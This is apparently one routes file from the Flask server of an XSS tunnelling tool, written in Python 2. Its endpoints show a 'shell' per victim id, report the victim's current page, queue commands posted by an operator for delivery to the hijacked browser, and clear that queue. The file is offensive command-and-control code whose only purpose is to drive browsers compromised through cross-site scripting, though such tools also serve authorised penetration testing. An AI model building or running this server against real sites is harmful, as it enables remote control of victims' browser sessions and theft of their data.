from xss_tunnel_server import app, commandStore, victimStore
from flask import json, request, render_template

@app.route('/shell/<id>',  methods=['GET'])
def shell(id):
    commands = commandStore.getCommands(id)

    return render_template('shell.html', title = 'Shell', id = id, commands = commands)

@app.route('/shellCommands/<id>',  methods=['GET'])
def command(id):
    commands = commandStore.getCommands(id)

    return render_template('commands.html', title = 'Shell Commands', commands = commands)

@app.route('/currentPage/<id>',  methods=['GET'])
def current_page(id):
    return victimStore.getVictim(id).currentPage

@app.route('/receiveShellCommand/<id>', methods=['POST'])
def receive_command(id):
    print request.data
    command = json.loads(request.data)

    if command.has_key('id'):
        commandStore.addCommand(id, command)
        victimStore.getVictim(id).queueCommand(command)

    return 'ok'

@app.route('/clear/<id>', methods=['GET'])
def clear_command(id):
    commandStore.clear(id)
    return 'ok'
